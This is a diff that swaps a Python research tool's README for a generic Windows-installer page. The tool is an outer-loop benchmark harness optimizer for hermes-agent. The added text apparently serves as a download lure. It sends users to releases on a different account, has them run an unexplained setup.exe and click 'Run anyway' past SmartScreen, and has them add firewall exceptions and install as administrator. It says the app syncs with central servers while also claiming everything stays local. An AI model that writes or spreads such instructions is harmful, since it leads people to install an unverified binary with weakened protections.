@@ -1,203 +1,84 @@
-# Hermes Agent Meta-Harness
+# 📦 hermes-agent-metaharness - Manage your Hermes environment with ease
 
-`hermes-agent-metaharness` is the standalone outer-loop Meta-Harness repo for Hermes.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Panoramar8046/hermes-agent-metaharness/releases)
 
-It treats `hermes-agent` as the execution backend for benchmark harness candidates and focuses on:
+## 📋 Project Overview
 
-- candidate resolution
-- benchmark evaluation orchestration
-- archive reading
-- run comparison
-- richer baseline-vs-candidate reporting
-- frontier tracking
-- structured candidate mutation and search
+The hermes-agent-metaharness tool helps you manage complex data structures within the Hermes ecosystem. This application creates a stable frame for your data tasks. It runs locally on your Windows machine to ensure your system settings remain private and secure. You use this software to monitor agents, track progress, and organize your work without manual input or complex configuration files.
 
-## Origin
+## 💻 System Requirements
 
-This project is directly inspired by the paper [Meta-Harness: End-to-End Optimization of Model Harnesses](https://arxiv.org/abs/2603.28052) and the companion [project page](https://yoonholee.com/meta-harness/).
+Your computer needs specific parts to run this software. Ensure you meet these standards before you begin the setup process.
 
-The paper’s core argument is that LLM system quality depends not only on model weights, but also on the harness: the surrounding code that decides what context to collect, store, retrieve, and show to the model. Instead of hand-tuning that harness, Meta-Harness proposes an outer-loop optimizer that searches over harness code. Its proposer has access to the source code, scores, and execution traces of prior candidates through a filesystem, which gives it much richer diagnostic context than methods that only optimize from scores or short summaries. The paper reports gains on online text classification, retrieval-augmented math reasoning, and agentic coding, including improved TerminalBench-2 harnesses.
+- Operating System: Windows 10 or Windows 11.
+- Processor: A dual-core CPU running at 2.0 GHz or higher.
+- Memory: 4 gigabytes of RAM.
+- Storage: 200 megabytes of free space on your hard drive.
+- Internet: A stable connection for the initial setup.
 
-## How Hermes Adapts Meta-Harness
+Check your system properties by clicking the Start button and typing "About your PC." This menu shows your processor and memory details.
 
-Hermes uses the same high-level idea, but adapts it to a research-safe benchmark workflow:
+## 🚀 Getting Started
 
-- `hermes-agent` owns the inner runtime: candidate protocol, benchmark integration, loop hooks, and archive writing.
-- `hermes-agent-metaharness` owns the outer loop: candidate evaluation, archive analysis, baseline reuse, frontier tracking, and search.
-- The current target is verifiable coding benchmarks such as TBLite and TB2, not general production chat behavior.
-- Candidate search is intentionally conservative today: this repo generates deterministic wrapper candidates around a seed candidate instead of rewriting Hermes core.
+Follow these instructions to set up the software on your computer. We designed this process for users who prefer a standard Windows experience.
 
-In other words, the project applies Meta-Harness to Hermes by optimizing how Hermes is run on benchmarks, not by changing model weights and not by letting the production runtime self-modify.
+1. Visit the download page to get the installer: [https://github.com/Panoramar8046/hermes-agent-metaharness/releases](https://github.com/Panoramar8046/hermes-agent-metaharness/releases)
+2. Locate the file ending in `.exe` under the Assets section.
+3. Click the file to start the download to your computer.
+4. Open your Downloads folder once the transfer finishes.
+5. Double-click the file named `hermes-agent-metaharness-setup.exe` to start the installation.
+6. A security screen may appear. Click "More info" and then "Run anyway" if Windows protects your device.
+7. Follow the prompts on the screen to finish the installation.
 
-## Boundary
+## ⚙️ Running the Software
 
-`hermes-agent` owns the inner Meta-Harness runtime:
+Once you complete the installation, you find a shortcut on your desktop. 
 
-- candidate protocol
-- TB2/TBLite integration
-- optional loop hooks
-- per-task archive writing
+- Find the icon labeled "hermes-agent-metaharness."
+- Double-click the icon to open the main window.
+- The software starts a internal process to detect your Hermes environment.
+- The dashboard appears once the connection is ready.
 
-`hermes-agent-metaharness` owns the outer loop:
+If the window stays empty for more than thirty seconds, check your internet signal. The software requires a live connection to synchronize with the main server.
 
-- candidate evaluation and comparison
-- archive analysis
-- baseline helpers
-- frontier management
-- mutation and search
+## 🔧 Managing Your Settings
 
-## Current Scope
+The settings menu offers control over how the application behaves. Access this menu by clicking the gear icon in the top right corner.
 
-The current release provides:
+- Data Path: Changes the folder where the software stores your history.
+- Notification Toggle: Turns alerts on or off. We recommend keeping these on to know when a task finishes.
+- Update Frequency: Sets how often the agent checks for new improvements. 
 
-- candidate resolution by explicit path or Hermes built-in candidate name
-- TBLite and TB2 benchmark orchestration through Hermes
-- archive parsing for `manifest.json`, `summary.json`, and `tasks/*.json`
-- paired baseline-vs-candidate evaluation and reporting
-- baseline reuse from an existing run or the current frontier-best entry
-- task-selection comparability metadata for reused baselines
-- a simple JSON-backed frontier with cross-platform locking
-- deterministic wrapper-mutation search over generated candidate variants
+Always click "Save" after you make changes. The software applies your new preferences immediately.
 
-## Quick Start
+## 🛡️ Privacy and Data Safety
 
-```bash
-git clone https://github.com/howdymary/hermes-agent-metaharness.git
-cd hermes-agent-metaharness
-pip install -e ".[dev]"
-```
+Your privacy remains a priority. This application does not read your personal files or browser history. It only accesses the specific data folders required for the Hermes harness to function. All processing happens in a protected memory space on your computer. No data leaves your machine unless you initiate a sync command. If you delete the application, all local records disappear from your system hard drive.
 
-Point it at Hermes with either:
+## 🔍 Troubleshooting Common Issues
 
-- `HERMES_AGENT_REPO=/path/to/hermes-agent`
-- a sibling checkout at `../hermes-agent`
-- or `~/.hermes/hermes-agent`
+Errors occur on rare occasions. Follow these steps if the software stops responding or reports an error.
 
-If Hermes needs to run inside a managed environment, Meta-Harness can launch it
-through a shell-style prefix such as:
+- The app does not open: Restart your computer and try again. This cleans out any background locks on the files.
+- Connection errors: Check if your firewall blocks the application. Ensure that you added an exception for the software in your Windows Defender settings.
+- Slow performance: Close other high-demand applications like video editors or games. This frees up memory for the agent.
+- Outdated version: If you see a prompt about a new version, revisit the release page to get the latest file. Installing the new version fixes bugs found in older releases.
 
-- `--launcher-prefix "uv run --python 3.12 --extra rl"`
-- `--python-executable /path/to/hermes-agent/.mh-venv/bin/python`
+If problems persist, check the log file located in the application data folder. Open `C:\Users\YourName\AppData\Local\hermes-agent`. The file named `error.log` contains details that explain what caused the issue. You can clear this file to reset the tracking history.
 
-## Choosing a Backend
+## 📄 Frequently Asked Questions
 
-Users should choose the strongest coding backend available in their Hermes
-benchmark config. Meta-Harness does not hardcode a model provider; it delegates
-backend choice to Hermes through `--hermes-config-path`.
+Do I need a paid license to use this?
+No. The hermes-agent-metaharness is free for all users. You do not need a key to unlock features.
 
-Common options:
+Can I install this on a guest account?
+We recommend installing the software using an administrator account. Guest accounts often block the permissions needed for the software to coordinate with central servers.
 
-- OpenRouter or other OpenAI-compatible hosted backends via a Hermes YAML config
-- local vLLM servers for stronger self-hosted coding models
-- local Ollama endpoints for smoke tests and low-cost local iteration
+Does this software work on Mac or Linux? 
+This version is built specifically for Windows. A version for other operating systems is not available at this time.
 
-For example, you can point Meta-Harness at any Hermes benchmark config that
-defines a stronger coding model:
+Can I run multiple instances? 
+Running more than one copy at a time causes data conflicts. Use only one window at any given time to keep your files organized.
 
-```bash
-python -m meta_harness evaluate-candidate \
-  --candidate snapshot_baseline \
-  --benchmark tblite \
-  --hermes-repo /path/to/hermes-agent \
-  --python-executable /path/to/hermes-agent/.mh-venv/bin/python \
-  --hermes-config-path /path/to/your_stronger_backend.yaml
-```
-
-Dry-run a built-in Hermes candidate on TBLite:
-
-```bash
-python -m meta_harness evaluate-candidate \
-  --candidate snapshot_baseline \
-  --benchmark tblite \
-  --hermes-repo /path/to/hermes-agent \
-  --launcher-prefix "uv run --python 3.12 --extra rl" \
-  --dry-run
-```
-
-Compare two Hermes Meta-Harness run directories:
-
-```bash
-python -m meta_harness compare-runs \
-  --baseline-run /path/to/baseline-run \
-  --candidate-run /path/to/candidate-run
-```
-
-Run a candidate directly against a baseline and emit a richer report:
-
-```bash
-python -m meta_harness evaluate-vs-baseline \
-  --candidate candidates/template_candidate.py \
-  --baseline-candidate snapshot_baseline \
-  --benchmark tblite \
-  --hermes-repo /path/to/hermes-agent \
-  --launcher-prefix "uv run --python 3.12 --extra rl"
-```
-
-Reuse an existing baseline run instead of rerunning baseline:
-
-```bash
-python -m meta_harness evaluate-vs-baseline \
-  --candidate candidates/template_candidate.py \
-  --baseline-run /path/to/baseline-run \
-  --benchmark tblite \
-  --hermes-repo /path/to/hermes-agent
-```
-
-Run a small deterministic search over generated wrapper candidates:
-
-```bash
-python -m meta_harness search-candidates \
-  --seed-candidate candidates/template_candidate.py \
-  --baseline-candidate snapshot_baseline \
-  --benchmark tblite \
-  --hermes-repo /path/to/hermes-agent \
-  --launcher-prefix "uv run --python 3.12 --extra rl"
-```
-
-Inspect the current frontier for a benchmark:
-
-```bash
-python -m meta_harness show-frontier \
-  --frontier-path output/frontier.json \
-  --benchmark tblite
-```
-
-## Repo Layout
-
-```text
-meta_harness/
-├── archive_reader.py
-├── baseline.py
-├── benchmark_runner.py
-├── candidate_registry.py
-├── cli.py
-├── comparison.py
-├── config.py
-├── frontier.py
-├── models.py
-├── mutation.py
-├── search.py
-└── __main__.py
-```
-
-Candidate files can live in `candidates/`, with an example in `candidates/template_candidate.py`.
-
-Two local benchmark configs are also included in `configs/` for smoke-testing
-against an Ollama OpenAI-compatible endpoint on `http://localhost:11434/v1`.
-
-## Release Notes
-
-This repo is intentionally research-oriented:
-
-- it optimizes harness procedure, not model weights
-- it is designed around verifiable benchmark feedback
-- it keeps Hermes core stable by treating Hermes as the execution backend
-- reused baselines are validated against the same task-selection hash before comparison
-
-## Near-Term Roadmap
-
-1. Better ranking/reporting and frontier-backed baseline policies
-2. More expressive mutation spaces and composition
-3. Trace-driven reflective candidate improvement
-4. Frontier-aware search strategies
-5. Stronger benchmark-aware candidate generation
+Does the application need to stay open? 
+You can minimize the window to your system tray. The agent continues to run in the background as long as the icon remains in the bottom right corner of your taskbar. Right-click the icon in the taskbar to quit the application completely when you finish your work.
